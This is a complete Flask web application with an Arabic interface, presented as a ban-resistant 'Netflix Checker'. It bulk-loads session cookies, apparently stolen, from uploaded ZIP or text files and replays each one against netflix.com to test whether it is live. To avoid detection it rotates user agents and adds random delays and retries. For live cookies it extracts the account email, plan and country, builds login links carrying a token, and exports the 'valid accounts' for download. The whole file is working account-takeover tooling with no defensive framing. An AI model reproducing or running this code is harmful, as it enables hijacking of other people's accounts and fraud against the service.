from flask import Flask, render_template_string, request, jsonify
import requests, re, json, base64, os, time, random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

HTML = r'''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Checker Pro – النسخة المقاومة للحظر</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <style>
        :root { --bg:#0f0f0f; --card:#1e1e1e; --input:#252525; --red:#e50914; --green:#2ecc71; --yellow:#f39c12; --white:#fff; --text2:#b3b3b3; --border:#333; --radius:12px; }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Cairo',sans-serif; background:var(--bg); color:var(--white); padding:20px; }
        .container { max-width:1000px; margin:auto; }
        .logo { text-align:center; font-size:3em; font-weight:900; color:var(--red); letter-spacing:5px; }
        h1 { text-align:center; color:var(--white); }
        .two-cols { display:grid; grid-template-columns:1fr 1fr; gap:20px; margin:20px 0; }
        @media(max-width:700px){ .two-cols{grid-template-columns:1fr;} }
        .upload-area {
            border:2px dashed var(--border); border-radius:var(--radius); padding:30px; text-align:center;
            background:var(--input); cursor:pointer; min-height:160px; display:flex; flex-direction:column; justify-content:center;
        }
        .upload-area:hover, .upload-area.dragover { border-color:var(--red); }
        textarea {
            width:100%; height:160px; background:var(--input); border:1px solid var(--border);
            border-radius:var(--radius); color:var(--white); padding:12px; font-family:monospace; direction:ltr;
        }
        .btn { padding:10px 20px; border:none; border-radius:6px; font-weight:700; cursor:pointer; color:var(--white); }
        .btn-primary { background:var(--red); }
        .btn-success { background:var(--green); }
        .btn-warning { background:#e67e22; }
        .btn-danger { background:#c0392b; }
        .btn:disabled { opacity:0.5; }
        .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(100px,1fr)); gap:8px; margin:15px 0; }
        .stat { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:10px; text-align:center; }
        .stat-icon { font-size:1.6em; }
        .stat-val { font-size:1.8em; font-weight:900; }
        .stat-label { color:var(--text2); font-size:0.7em; }
        .result-card { background:var(--card); border:1px solid var(--border); border-radius:8px; margin:8px 0; }
        .result-header { padding:12px; display:flex; justify-content:space-between; cursor:pointer; }
        .badge { padding:4px 10px; border-radius:12px; font-size:0.75em; font-weight:700; }
        .badge-valid { background:rgba(46,204,113,0.15); color:var(--green); }
        .badge-invalid { background:rgba(229,9,20,0.15); color:var(--red); }
        .badge-error { background:rgba(243,156,18,0.15); color:var(--yellow); }
        .result-body { display:none; padding:0 12px 12px; }
        .result-body.show { display:block; }
        .cookie-box { background:var(--input); padding:8px; border-radius:4px; font-family:monospace; direction:ltr; word-break:break-all; }
        .detail-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr)); gap:6px; margin:8px 0; }
        .detail-item { background:var(--input); padding:8px; border-radius:4px; text-align:center; }
        .token-section { background:var(--input); border-radius:6px; padding:10px; margin-top:8px; }
        .links-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:6px; margin-top:8px; }
        .link-card { background:var(--card); border:1px solid var(--border); border-radius:6px; padding:8px; text-align:center; }
        .copy-btn, .open-btn { padding:4px 10px; border:none; border-radius:4px; cursor:pointer; font-weight:600; margin:2px; }
        .copy-btn { background:var(--green); color:var(--white); }
        .open-btn { background:var(--red); color:var(--white); }
        .toast { position:fixed; top:15px; left:50%; transform:translateX(-50%); padding:10px 25px; border-radius:6px; color:var(--white); font-weight:700; z-index:9999; }
        .toast-success { background:var(--green); }
        .toast-error { background:var(--red); }
        .toast-info { background:var(--blue); }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">NETFLIX</div>
        <h1>🔍 فاحص الكوكيز – بحماية من الحظر</h1>
        <div class="two-cols">
            <div>
                <div style="font-weight:700; margin-bottom:8px;">📁 رفع ملف ZIP</div>
                <div class="upload-area" id="uploadArea">
                    <div style="font-size:2em">📤</div>
                    <div>اسحب ملف ZIP هنا</div>
                    <div style="color:var(--text2); font-size:0.7em;">يستخرج الكوكيز تلقائياً</div>
                </div>
                <input type="file" id="fileInput" accept=".zip,.txt,.csv" multiple style="display:none">
            </div>
            <div>
                <div style="font-weight:700; margin-bottom:8px;">📋 لصق الكوكيز</div>
                <textarea id="cookieTextarea" placeholder="الصق الكوكيز هنا..."></textarea>
            </div>
        </div>
        <div style="text-align:center; margin:15px 0;">
            <button class="btn btn-primary" id="btnCheck" onclick="startCheck()">🚀 ابدأ الفحص</button>
            <button class="btn btn-danger" id="btnStop" onclick="stopCheck()" style="display:none;">⏹️ إيقاف</button>
            <button class="btn btn-success" id="btnDownloadValid" disabled onclick="downloadValid()">💾 تحميل الصالحة</button>
            <button class="btn btn-warning" onclick="clearAll()">🗑️ مسح</button>
        </div>
        <div id="progress" style="display:none; margin:10px 0;">
            <div style="height:6px; background:var(--input); border-radius:3px;"><div id="progressFill" style="height:100%; background:var(--red); width:0%;"></div></div>
            <div id="progressText" style="text-align:center; color:var(--text2); font-size:0.8em;"></div>
        </div>
        <div class="stats">
            <div class="stat"><div class="stat-icon">📝</div><div class="stat-val" id="statTotal" style="color:var(--blue)">0</div><div class="stat-label">الإجمالي</div></div>
            <div class="stat"><div class="stat-icon">✅</div><div class="stat-val" id="statValid" style="color:var(--green)">0</div><div class="stat-label">صالحة</div></div>
            <div class="stat"><div class="stat-icon">❌</div><div class="stat-val" id="statInvalid" style="color:var(--red)">0</div><div class="stat-label">غير صالحة</div></div>
            <div class="stat"><div class="stat-icon">⚠️</div><div class="stat-val" id="statErrors" style="color:var(--yellow)">0</div><div class="stat-label">أخطاء</div></div>
        </div>
        <div id="resultsList"></div>
    </div>
    <script>
        let allCookies = [], allResults = [], abortController = null, isChecking = false;
        const uploadArea = document.getElementById('uploadArea'), fileInput = document.getElementById('fileInput'),
              cookieTextarea = document.getElementById('cookieTextarea'), btnCheck = document.getElementById('btnCheck'),
              btnStop = document.getElementById('btnStop'), btnDownloadValid = document.getElementById('btnDownloadValid');

        uploadArea.addEventListener('click',()=>fileInput.click());
        uploadArea.addEventListener('dragover',e=>{e.preventDefault();uploadArea.classList.add('dragover');});
        uploadArea.addEventListener('dragleave',()=>uploadArea.classList.remove('dragover'));
        uploadArea.addEventListener('drop',e=>{e.preventDefault();uploadArea.classList.remove('dragover');handleFiles(e.dataTransfer.files);});
        fileInput.addEventListener('change',e=>handleFiles(e.target.files));

        async function handleFiles(files) {
            for(let file of files){
                if(file.name.endsWith('.zip')){
                    try{
                        const zip = await JSZip.loadAsync(file);
                        for(let [name,entry] of Object.entries(zip.files)){
                            if(!entry.dir && (name.endsWith('.txt')||name.endsWith('.csv'))){
                                const text = await entry.async('string');
                                text.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes('=')).forEach(c=>allCookies.push(c));
                            }
                        }
                    }catch(e){}
                }else if(file.name.endsWith('.txt')||file.name.endsWith('.csv')){
                    const text = await file.text();
                    text.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes('=')).forEach(c=>allCookies.push(c));
                }
            }
            if(allCookies.length) showToast(`📦 تم تحميل ${allCookies.length} كوكيز`,'info');
        }

        function collectAllCookies(){
            const manual = cookieTextarea.value.trim().split('\n').map(l=>l.trim()).filter(l=>l&&l.includes('='));
            return [...new Set([...allCookies, ...manual])];
        }

        async function startCheck(){
            const cookies = collectAllCookies();
            if(!cookies.length) return showToast('لا توجد كوكيز','error');
            isChecking = true; abortController = new AbortController(); signal = abortController.signal;
            btnCheck.style.display='none'; btnStop.style.display='inline-flex';
            document.getElementById('progress').style.display='block';
            document.getElementById('resultsList').innerHTML = '';
            allResults = []; const start = Date.now(); const total = cookies.length;
            let processed = 0; const batchSize = 10;  // دفعات أصغر

            for(let i=0;i<total;i+=batchSize){
                if(signal.aborted) break;
                const batch = cookies.slice(i,i+batchSize).join('\n');
                try{
                    const resp = await fetch('/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:batch}),signal});
                    const data = await resp.json();
                    if(data.results) allResults.push(...data.results);
                }catch(e){if(e.name==='AbortError')break;}
                processed = Math.min(i+batchSize,total);
                document.getElementById('progressFill').style.width = (processed/total*100)+'%';
                document.getElementById('progressText').textContent = `${processed}/${total}`;
                renderResults(); updateStats();
            }
            document.getElementById('progress').style.display='none';
            btnCheck.style.display='inline-flex'; btnStop.style.display='none';
            btnDownloadValid.disabled = !allResults.some(r=>r.status==='valid');
            isChecking = false; updateStats(); renderResults();
            showToast(signal.aborted?'⏹️ توقف':'✅ اكتمل', signal.aborted?'info':'success');
        }
        function stopCheck(){if(abortController)abortController.abort();}

        function renderResults(){
            const container = document.getElementById('resultsList');
            const statusText = {valid:'✅ صالحة', invalid:'❌ غير صالحة', error:'⚠️ خطأ'};
            container.innerHTML = allResults.map((r,idx)=>{
                const cls = 'badge-'+(r.status||'unknown');
                let details = '';
                if(r.details){
                    details = '<div class="detail-grid">';
                    for(let [k,v] of Object.entries({membership:'العضوية',plan:'الباقة',country:'البلد',email:'البريد'}))
                        if(r.details[k]) details += `<div class="detail-item"><small>${v}</small><br><strong>${r.details[k]}</strong></div>`;
                    details += '</div>';
                }
                const cookieText = r.cookie||'';
                return `<div class="result-card"><div class="result-header" onclick="this.nextElementSibling.classList.toggle('show')"><div style="display:flex;align-items:center;gap:8px;"><span class="badge ${cls}">${statusText[r.status]||'؟'}</span><span>${r.message||''}</span></div><span>▼</span></div><div class="result-body">${details}<div class="cookie-box">${escapeHtml(cookieText)}</div><button class="copy-btn" onclick="navigator.clipboard.writeText('${escapeQuotes(cookieText)}')">📋 نسخ الكوكيز</button>${r.api_tokens?.api_token?`<div class="token-section"><strong>🔑 ApiToken</strong><div style="background:#000;color:var(--green);padding:6px;border-radius:4px;font-family:monospace;">${r.api_tokens.api_token}</div><button class="copy-btn" onclick="navigator.clipboard.writeText('${escapeQuotes(r.api_tokens.api_token)}')">📋 نسخ</button><div class="links-grid">${Object.entries(r.api_tokens.direct_links).map(([k,d])=>`<div class="link-card"><div>${d.name}</div><button class="open-btn" onclick="window.open('${d.url}')">🔗 فتح</button><button class="copy-btn" onclick="navigator.clipboard.writeText('${escapeQuotes(d.url)}')">📋 نسخ</button></div>`).join('')}</div></div>`:''}</div></div>`;
            }).join('');
        }

        function escapeHtml(t){return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
        function escapeQuotes(t){return t.replace(/'/g,"\\'").replace(/"/g,'&quot;');}
        function updateStats(){
            document.getElementById('statTotal').textContent = allResults.length;
            document.getElementById('statValid').textContent = allResults.filter(r=>r.status==='valid').length;
            document.getElementById('statInvalid').textContent = allResults.filter(r=>r.status==='invalid').length;
            document.getElementById('statErrors').textContent = allResults.filter(r=>r.status==='error').length;
        }
        function downloadValid(){
            const valid = allResults.filter(r=>r.status==='valid');
            if(!valid.length) return;
            let txt = '═══ حسابات Netflix الصالحة ═══\n\n';
            valid.forEach((r,i)=>{
                txt += `[${i+1}]\nالكوكيز: ${r.cookie}\n`;
                if(r.details) txt += `البريد: ${r.details.email||''}\nالعضوية: ${r.details.membership||''}\n`;
                if(r.api_tokens?.api_token) txt += `ApiToken: ${r.api_tokens.api_token}\n`;
                txt += '─'.repeat(30)+'\n';
            });
            const blob = new Blob([txt],{type:'text/plain'});
            const a = document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='netflix_valid.txt'; a.click();
        }
        function showToast(msg,type){const el=document.createElement('div');el.className=`toast toast-${type}`;el.textContent=msg;document.body.appendChild(el);setTimeout(()=>el.remove(),2000);}
        function clearAll(){
            allCookies=[]; allResults=[]; cookieTextarea.value=''; document.getElementById('resultsList').innerHTML='';
            btnDownloadValid.disabled=true; updateStats();
        }
    </script>
</body>
</html>
'''

# قائمة User‑Agents متنوعة لتفادي البصمة
USER_AGENTS = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
]

def check_cookie_with_retry(cookie, max_retries=2):
    """ فحص الكوكيز مع إعادة المحاولة في حالات الفشل المؤقت """
    last_exception = None
    for attempt in range(max_retries + 1):
        try:
            sess = requests.Session()
            # اختيار User‑Agent عشوائي
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cookie': cookie,
            }
            # الخطوة الأولى: الصفحة الرئيسية
            r1 = sess.get('https://www.netflix.com/', headers=headers, timeout=15, allow_redirects=True)
            time.sleep(random.uniform(0.5, 1.5))  # تأخير أطول قليلاً
            # الخطوة الثانية: صفحة الحساب
            r2 = sess.get('https://www.netflix.com/YourAccount', headers=headers, timeout=20, allow_redirects=True, max_redirects=5)
            final_url = r2.url
            result = {'status':'unknown','message':'','cookie':cookie,'details':{},'api_tokens':{}}

            if 'login' in final_url.lower():
                result['status'] = 'invalid'
                result['message'] = '❌ منتهية الصلاحية'
                return result

            text = r2.text
            if 'membershipStatus' in text or 'profiles' in text or 'gps' in text:
                result['status'] = 'valid'
                result['message'] = '✅ كوكيز صالحة'
                # استخراج البيانات
                try:
                    data_match = re.search(r'window\.__netflix\.reactContext\s*=\s*({.*?});', text, re.DOTALL)
                    if data_match:
                        data = json.loads(data_match.group(1))
                        user_info = data.get('models',{}).get('userInfo',{}).get('data',{}) or \
                                    data.get('models',{}).get('serverModel',{}).get('data',{}).get('userInfo',{})
                        result['details'] = {
                            'email': user_info.get('email',''),
                            'membership': user_info.get('membershipStatus',''),
                            'plan': user_info.get('plan',{}).get('planName',''),
                            'country': user_info.get('countryOfSignup','')
                        }
                    else:
                        em = re.search(r'"email"\s*:\s*"([^"]+)"', text)
                        mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text)
                        result['details'] = {
                            'email': em.group(1) if em else '',
                            'membership': mm.group(1) if mm else '',
                        }
                except:
                    pass
                # ApiToken
                nid = re.search(r'NetflixId=([^;]+)', cookie)
                sid = re.search(r'SecureNetflixId=([^;]+)', cookie)
                if nid and sid:
                    payload = {'netflixId':nid.group(1),'secureNetflixId':sid.group(1),'timestamp':datetime.now().isoformat()}
                    token = base64.b64encode(json.dumps(payload).encode()).decode().replace('+','-').replace('/','_').replace('=','')
                    result['api_tokens'] = {
                        'api_token': token,
                        'direct_links': {
                            'computer': {'name':'💻 كمبيوتر','url':f'https://www.netflix.com/Login?apiToken={token}'},
                            'mobile': {'name':'📱 جوال','url':f'https://www.netflix.com/Login?apiToken={token}&deviceType=mobile'},
                            'tv': {'name':'📺 تلفاز','url':f'https://www.netflix.com/tv/login?apiToken={token}'}
                        }
                    }
                return result
            else:
                # ربما صفحة فارغة أو حظر
                if attempt < max_retries:
                    time.sleep(2 ** attempt)  # انتظار متزايد
                    continue
                result['status'] = 'error'
                result['message'] = '⚠️ تعذر التحقق (حظر محتمل)'
                return result
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            last_exception = e
            if attempt < max_retries:
                time.sleep(2 ** attempt)
                continue
        except Exception as e:
            # أخطاء أخرى لا نعيد المحاولة
            return {'status':'error','message':str(e),'cookie':cookie}

    # بعد استنفاد المحاولات
    return {'status':'error','message':f'فشل بعد {max_retries+1} محاولات: {str(last_exception)}','cookie':cookie}

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/check', methods=['POST'])
def check():
    data = request.get_json()
    cookies = data.get('cookies','')
    if not cookies: return jsonify([])
    lines = [c.strip() for c in cookies.split('\n') if c.strip() and '=' in c]
    results = []
    # تقليل workers إلى 2 لتخفيف الضغط
    with ThreadPoolExecutor(max_workers=2) as ex:
        futs = {ex.submit(check_cookie_with_retry, c):i for i,c in enumerate(lines,1)}
        for f in as_completed(futs):
            try:
                res = f.result()
                res['index'] = futs[f]
                results.append(res)
            except: pass
    results.sort(key=lambda x: x.get('index',0))
    return jsonify({'results':results})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT',5000)))
